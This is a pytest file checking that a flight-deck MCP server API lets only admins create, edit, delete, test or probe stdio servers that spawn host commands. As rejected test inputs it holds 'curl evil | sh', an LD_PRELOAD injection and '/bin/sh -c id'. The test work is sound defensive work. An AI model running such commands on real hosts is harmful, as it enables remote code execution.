"""A stdio MCP server is a command FD spawns on its own host, so with FD auth on
only an admin may create one, switch a server to stdio, edit or remove one, test
it, or probe an ad-hoc stdio config. HTTP servers stay manageable by any
signed-in user (the kiosk Connections dialog), and an auth-off deck — one
trusted user, a synthetic admin — is unchanged.

Nothing here spawns a process: the manager's probe/test entry points are
replaced with recorders, and saving a record never starts its command.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from captain_claw.flight_deck import mcp_manager, mcp_routes, mcp_storage
from captain_claw.flight_deck.auth import get_current_user

ADMIN = {"id": "admin-1", "email": "a@x", "role": "admin"}
MEMBER = {"id": "user-1", "email": "u@x", "role": "user"}

STDIO = {"name": "local", "transport": "stdio", "command": "/bin/echo", "args": ["hi"]}
HTTP = {"name": "remote", "transport": "http", "url": "https://upstream.example/mcp"}


@pytest.fixture(autouse=True)
def _isolate(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
    monkeypatch.setenv("CAPTAIN_CLAW_FD_MCP_PATH", str(tmp_path / "mcp_servers.json"))
    monkeypatch.setenv("FD_AUTH_ENABLED", "true")
    mcp_manager._manager = None  # noqa: SLF001
    yield
    mcp_manager._manager = None  # noqa: SLF001


@pytest.fixture
def spawns(monkeypatch: pytest.MonkeyPatch) -> list[tuple[str, Any]]:
    """Record every probe/test that would reach a transport (and so, for stdio,
    spawn the command) instead of running it."""
    calls: list[tuple[str, Any]] = []
    manager = mcp_manager.get_manager()

    async def _probe(record: dict[str, Any]) -> dict[str, Any]:
        calls.append(("probe", record))
        return {"ok": True, "tools_count": 0, "tool_names": []}

    async def _test(name: str) -> dict[str, Any]:
        calls.append(("test", name))
        return {"ok": True, "tools_count": 0, "tool_names": []}

    monkeypatch.setattr(manager, "probe_record", _probe)
    monkeypatch.setattr(manager, "test_server", _test)
    return calls


def _client(user: dict | None) -> TestClient:
    app = FastAPI()
    app.include_router(mcp_routes.router)
    if user is not None:
        app.dependency_overrides[get_current_user] = lambda: dict(user)
    return TestClient(app)


async def _seed(record: dict[str, Any]) -> None:
    await mcp_storage.upsert_server(dict(record))


# ── create / update ─────────────────────────────────────────────────


def test_member_cannot_create_stdio_server() -> None:
    resp = _client(MEMBER).post("/fd/mcp/servers", json=STDIO)
    assert resp.status_code == 403
    assert mcp_storage.get_server("local") is None


def test_member_transport_casing_does_not_slip_past_the_gate() -> None:
    resp = _client(MEMBER).post("/fd/mcp/servers", json={**STDIO, "transport": " STDIO "})
    assert resp.status_code == 403
    assert mcp_storage.get_server("local") is None


def test_admin_can_create_stdio_server() -> None:
    resp = _client(ADMIN).post("/fd/mcp/servers", json=STDIO)
    assert resp.status_code == 200, resp.text
    saved = mcp_storage.get_server("local")
    assert saved is not None and saved["transport"] == "stdio"
    assert saved["command"] == "/bin/echo"


def test_member_can_still_create_and_edit_http_server() -> None:
    client = _client(MEMBER)
    resp = client.post("/fd/mcp/servers", json=HTTP)
    assert resp.status_code == 200, resp.text
    resp = client.post(
        "/fd/mcp/servers", json={**HTTP, "url": "https://other.example/mcp"}
    )
    assert resp.status_code == 200, resp.text
    assert mcp_storage.get_server("remote")["url"] == "https://other.example/mcp"
    assert client.delete("/fd/mcp/servers/remote").status_code == 200


@pytest.mark.asyncio
async def test_member_cannot_switch_http_server_to_stdio() -> None:
    await _seed(HTTP)
    resp = _client(MEMBER).post(
        "/fd/mcp/servers",
        json={"name": "remote", "transport": "stdio", "command": "/bin/sh", "args": ["-c", "id"]},
    )
    assert resp.status_code == 403
    rec = mcp_storage.get_server("remote")
    assert rec["transport"] == "http" and rec["command"] == ""


@pytest.mark.asyncio
async def test_member_cannot_edit_stdio_command_args_or_env() -> None:
    await _seed(STDIO)
    client = _client(MEMBER)
    for change in (
        {"command": "/bin/sh"},
        {"args": ["-c", "curl evil | sh"]},
        {"env": {"LD_PRELOAD": "/tmp/x.so"}},
        {"enabled": False},
    ):
        resp = client.post("/fd/mcp/servers", json={**STDIO, **change})
        assert resp.status_code == 403, change
    rec = mcp_storage.get_server("local")
    assert rec["command"] == "/bin/echo" and rec["args"] == ["hi"] and rec["env"] == {}
    assert rec["enabled"] is True


@pytest.mark.asyncio
async def test_member_cannot_turn_stdio_server_into_http() -> None:
    # Overwriting an admin's stdio server is still editing it.
    await _seed(STDIO)
    resp = _client(MEMBER).post(
        "/fd/mcp/servers",
        json={"name": "local", "transport": "http", "url": "https://x.example/mcp"},
    )
    assert resp.status_code == 403
    assert mcp_storage.get_server("local")["transport"] == "stdio"


@pytest.mark.asyncio
async def test_admin_can_edit_stdio_server() -> None:
    await _seed(STDIO)
    resp = _client(ADMIN).post("/fd/mcp/servers", json={**STDIO, "args": ["bye"]})
    assert resp.status_code == 200, resp.text
    assert mcp_storage.get_server("local")["args"] == ["bye"]


# ── delete / test / probe ───────────────────────────────────────────


@pytest.mark.asyncio
async def test_member_cannot_delete_stdio_server() -> None:
    await _seed(STDIO)
    resp = _client(MEMBER).delete("/fd/mcp/servers/local")
    assert resp.status_code == 403
    assert mcp_storage.get_server("local") is not None


@pytest.mark.asyncio
async def test_admin_can_delete_stdio_server() -> None:
    await _seed(STDIO)
    assert _client(ADMIN).delete("/fd/mcp/servers/local").status_code == 200
    assert mcp_storage.get_server("local") is None


@pytest.mark.asyncio
async def test_member_cannot_test_stdio_server(spawns) -> None:
    await _seed(STDIO)
    resp = _client(MEMBER).post("/fd/mcp/servers/local/test")
    assert resp.status_code == 403
    assert spawns == []
    assert _client(ADMIN).post("/fd/mcp/servers/local/test").status_code == 200
    assert spawns == [("test", "local")]


@pytest.mark.asyncio
async def test_member_can_test_http_server(spawns) -> None:
    await _seed(HTTP)
    assert _client(MEMBER).post("/fd/mcp/servers/remote/test").status_code == 200
    assert spawns == [("test", "remote")]


def test_member_cannot_probe_stdio_config(spawns) -> None:
    resp = _client(MEMBER).post("/fd/mcp/probe", json=STDIO)
    assert resp.status_code == 403
    assert spawns == []


def test_admin_can_probe_stdio_config(spawns) -> None:
    resp = _client(ADMIN).post("/fd/mcp/probe", json=STDIO)
    assert resp.status_code == 200, resp.text
    assert [kind for kind, _ in spawns] == ["probe"]
    assert spawns[0][1]["command"] == "/bin/echo"


def test_member_can_probe_http_config(spawns) -> None:
    resp = _client(MEMBER).post("/fd/mcp/probe", json=HTTP)
    assert resp.status_code == 200, resp.text
    assert [kind for kind, _ in spawns] == ["probe"]


# ── auth-disabled deck: one trusted user, unchanged ─────────────────


@pytest.mark.asyncio
async def test_auth_disabled_deck_manages_stdio_as_before(
    monkeypatch: pytest.MonkeyPatch, spawns
) -> None:
    monkeypatch.setenv("FD_AUTH_ENABLED", "false")
    client = _client(None)  # the real dependency: synthetic local admin
    assert client.post("/fd/mcp/servers", json=STDIO).status_code == 200
    assert client.post("/fd/mcp/servers", json={**STDIO, "args": ["x"]}).status_code == 200
    assert client.post("/fd/mcp/probe", json=STDIO).status_code == 200
    assert client.post("/fd/mcp/servers/local/test").status_code == 200
    assert client.delete("/fd/mcp/servers/local").status_code == 200
    assert mcp_storage.get_server("local") is None
